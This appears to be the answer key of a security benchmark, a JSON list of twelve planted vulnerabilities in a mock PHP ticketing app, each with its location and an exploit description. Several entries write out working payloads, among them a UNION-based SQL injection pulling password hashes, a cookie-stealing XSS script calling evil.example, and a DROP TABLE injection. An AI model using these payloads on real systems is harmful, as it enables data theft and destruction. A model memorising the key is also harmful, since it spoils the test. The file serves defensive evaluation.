@@ -1,0 +1,112 @@
+{
+  "defects": [
+    {
+      "id": "sqli-ticket-search",
+      "file": "mock-project/src/Domain/Repository/TicketRepository.php",
+      "defect_class": "sqli",
+      "line": 70,
+      "span_start": 67,
+      "span_end": 73,
+      "detectability_proof": "TicketRepository::search() builds the query as \"SELECT * FROM tickets WHERE subject LIKE '%{$query}%' OR description LIKE '%{$query}%' ORDER BY id DESC\" and runs it via $this->pdo->query($sql) with no parameter binding. TicketController::index() calls this whenever GET /tickets?q=... is non-empty. A request like GET /tickets?q=%25%27%20UNION%20SELECT%20email%2Cpassword_hash%2C3%2C4%2C5%2C6%2C7%2C8%2C9%20FROM%20users--%20- breaks out of the quoted LIKE literal and appends a UNION SELECT, exfiltrating user password hashes into the ticket list."
+    },
+    {
+      "id": "idor-ticket-detail",
+      "file": "mock-project/src/Http/Controller/TicketController.php",
+      "defect_class": "idor",
+      "line": 133,
+      "span_start": 124,
+      "span_end": 138,
+      "detectability_proof": "TicketController::download() fetches the ticket solely via $this->tickets->findById($id) and streams subject+description as a text attachment with no check that the requesting user is the ticket's requesterUserId, its assignee, or shares its company. Route GET /tickets/{id}/download requires only AuthMiddleware (Routes.php:58, inside the plain authenticated group), so any authenticated 'requester' user can enumerate GET /tickets/1/download, /tickets/2/download, ... and read every other customer's ticket content regardless of company."
+    },
+    {
+      "id": "xss-comment-body",
+      "file": "mock-project/templates/tickets/comments.twig",
+      "defect_class": "xss",
+      "line": 22,
+      "span_start": 19,
+      "span_end": 27,
+      "detectability_proof": "The comment list renders each comment as {{ c.body|raw }}, disabling Twig's default autoescaping. Any authenticated user can POST /tickets/{id}/comments with body=<script>document.location='https://evil.example/steal?c='+document.cookie</script>; every subsequent viewer of GET /tickets/{id}/comments (including agents/admins) executes that script in their session, since comment bodies are stored and rendered verbatim as raw HTML."
+    },
+    {
+      "id": "csrf-gap-comment-create",
+      "file": "mock-project/src/Http/Middleware/CsrfMiddleware.php",
+      "defect_class": "csrf_gap",
+      "line": 23,
+      "span_start": 17,
+      "span_end": 42,
+      "detectability_proof": "CsrfMiddleware::process() exempts requests from the token check when str_starts_with($path, '/api/') OR preg_match('#^/tickets/\\\\d+/comments$#', $path) === 1, before the mutating-method/token checks run. This means POST /tickets/{id}/comments (comment creation) is exempt from CSRF validation even though it's a plain HTML form-backed, session-authenticated, state-changing route: a cross-site form auto-submitting to https://victim-app/tickets/1/comments with a body field succeeds while the victim is logged in, with no _csrf field required."
+    },
+    {
+      "id": "session-fixation-login",
+      "file": "mock-project/src/Http/Controller/AuthController.php",
+      "defect_class": "session_fixation",
+      "line": 43,
+      "span_start": 27,
+      "span_end": 46,
+      "detectability_proof": "AuthController::login() sets $_SESSION['user_id'] = $user->id; directly after successful authentication and never calls session_regenerate_id(). An attacker who plants a known session id in the victim's browser before login (e.g. via a subdomain cookie, response-splitting, or simply sharing a login link containing a fixed PHPSESSID) retains a valid, now-authenticated session after the victim logs in with that same session id, letting the attacker access /tickets and other authenticated routes as the victim."
+    },
+    {
+      "id": "unsafe-compare-webhook-token",
+      "file": "mock-project/src/Http/Controller/WebhookController.php",
+      "defect_class": "unsafe_compare",
+      "line": 28,
+      "span_start": 20,
+      "span_end": 34,
+      "detectability_proof": "WebhookController::receiveStatusUpdate() checks $token !== null && $token == $this->config->webhookSecret using PHP's loose equality operator instead of hash_equals(). POST /api/webhooks/ticket-status is public and reachable without authentication (Routes.php:39); because == short-circuits comparison character-by-character without constant-time guarantees, an attacker who can measure response timing (or exploit PHP's loose-comparison type-juggling on unusual secret values) can incrementally recover WEBHOOK_SECRET and then forge status-update calls, e.g. POST with X-Webhook-Token: <recovered secret> and ticket_id=1&status=closed to silently close arbitrary tickets."
+    },
+    {
+      "id": "secret-logging-db-connect",
+      "file": "mock-project/src/Support/Database.php",
+      "defect_class": "secret_logging",
+      "line": 33,
+      "span_start": 12,
+      "span_end": 36,
+      "detectability_proof": "Database::connect()'s catch (\\PDOException $e) block calls error_log(\"Database connection failed: dsn={$dsn} user={$config->dbUsername} password={$config->dbPassword} - {$e->getMessage()}\"), writing the plaintext DB_PASSWORD to the server's error log. Any transient DB outage or misconfiguration (wrong host/port/credentials during a deploy) triggers this path on every request, so the production database password ends up readable in plaintext by anyone with log access (e.g. a log-aggregation service, shared hosting neighbor, or a separate log-disclosure bug)."
+    },
+    {
+      "id": "authz-missing-user-promote",
+      "file": "mock-project/src/Http/Routes.php",
+      "defect_class": "authz_missing",
+      "line": 68,
+      "span_start": 49,
+      "span_end": 69,
+      "detectability_proof": "$g->post('/users/{id}/promote', [Admin\\UserController::class, 'promote']) is registered inside the group closed only by ->add(new AuthMiddleware(...)) (line 69), not inside the '/admin' group that adds RoleMiddleware(['admin']) (lines 71-78) like its sibling GET /admin/users. Admin\\UserController::promote() itself performs no role check before calling UserRepository::updateRole(). Any authenticated 'requester' or 'agent' can POST /users/2/promote with body role=admin to grant themselves (or another account) the admin role."
+    },
+    {
+      "id": "race-condition-ticket-claim",
+      "file": "mock-project/src/Domain/Repository/TicketRepository.php",
+      "defect_class": "race_condition",
+      "line": 86,
+      "span_start": 84,
+      "span_end": 88,
+      "detectability_proof": "TicketController::claim() (lines 178-198) reads the ticket, checks if ($ticket->assigneeUserId !== null) return 422 (line 191), and only then calls TicketRepository::assignTo($id, $userId), which runs an unconditional UPDATE tickets SET assignee_user_id = :uid WHERE id = :id with no WHERE assignee_user_id IS NULL guard, no SELECT ... FOR UPDATE, and no transaction. Two agents issuing POST /tickets/5/claim within the same read-check window both pass the null check before either UPDATE lands; both requests return 302 success, but the second UPDATE silently overwrites the first assignee, so one agent believes they own a ticket they don't."
+    },
+    {
+      "id": "transaction-gap-status-comment",
+      "file": "mock-project/src/Http/Controller/TicketController.php",
+      "defect_class": "transaction_gap",
+      "line": 168,
+      "span_start": 146,
+      "span_end": 171,
+      "detectability_proof": "TicketController::changeStatus() calls $this->tickets->updateStatus($id, $desired) (line 167) and then $this->comments->insert(new Comment(...)) (line 168) as two independent, non-transactional writes. If the comment insert fails after the status UPDATE has already committed (e.g. a transient DB error, connection drop, or future validation added to CommentRepository::insert), POST /tickets/{id}/status leaves the ticket in its new status with no audit-trail comment recorded — the two statements can partially apply."
+    },
+    {
+      "id": "sqli-ticket-sort",
+      "file": "mock-project/src/Domain/Repository/TicketRepository.php",
+      "defect_class": "sqli",
+      "line": 102,
+      "span_start": 99,
+      "span_end": 104,
+      "detectability_proof": "TicketRepository::findAllSorted() does $column = self::SORT_COLUMNS[$sortBy] ?? $sortBy;, falling back to the raw, attacker-controlled $sortBy when it isn't one of the whitelisted keys ('subject'|'status'|'created'), then interpolates it directly into \"SELECT * FROM tickets ORDER BY {$column} \" . (...). TicketController::index() reaches this via GET /tickets?sort=... (when no ?q= is set). A request like GET /tickets?sort=id)%3B%20DROP%20TABLE%20users%3B--%20 or a boolean/time-based ORDER BY injection (e.g. sort=(SELECT CASE WHEN (1=1) THEN id ELSE subject END)) is placed verbatim into the ORDER BY clause since it never matches the whitelist and is used as-is."
+    },
+    {
+      "id": "idor-comment-delete",
+      "file": "mock-project/src/Http/Controller/CommentController.php",
+      "defect_class": "idor",
+      "line": 82,
+      "span_start": 72,
+      "span_end": 85,
+      "detectability_proof": "CommentController::delete() fetches the comment via $this->comments->findById($commentId) and immediately calls $this->comments->delete($commentId) with no check that $comment->authorUserId === current user->id, nor any admin/agent role check. Any authenticated user can POST /tickets/{ticketId}/comments/{commentId}/delete for a commentId they didn't author (found by incrementing IDs) and permanently delete another user's comment."
+    }
+  ]
+}
